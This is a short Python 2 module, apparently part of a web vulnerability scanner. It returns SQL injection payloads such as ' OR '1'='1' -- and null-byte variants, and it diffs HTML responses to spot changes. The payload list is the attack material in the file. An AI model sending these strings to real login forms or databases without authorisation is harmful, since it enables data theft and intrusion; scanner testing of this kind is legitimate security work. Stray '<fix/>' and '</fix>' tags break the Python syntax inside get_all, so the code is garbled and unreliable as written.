import difflib

def get_false():
	payloads = ["' and ' 1=2"]
	return payloads

def get_all():
	<fix/>"""
	Consider different db types and versions
	-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
	' OR '1'='1' --
	' OR '1'='1' /*
	-- MySQL
	' OR '1'='1' #
	-- Access (using null characters)
	' OR '1'='1' %00
	' OR '1'='1' %16
	"""
	payloads = ["' or '1=1", "' or 1=1--", "'=1\' or \'1\' = \'1\'", "'1 'or' 1 '=' 1", "'or 1=1#", "' OR '1'='1' --", "' OR '1'='1' %00"]</fix>
	payloads = [(item, "SQL Injection") for item in payloads]
	return payloads	

def compare_html(html1, html2):
	diff_html = ""
	diffs = difflib.ndiff(html1.splitlines(), html2.splitlines())
	for ele in diffs:
		if (ele[0] == "-"):
			diff_html += "<del>%s</del>" % ele[1:].strip()
		elif(ele[0] == "+"):
			diff_html += "<ins>%s</ins>" %ele[1:].strip()

	return diff_html

if __name__ == "__main__":	
	print get_all()
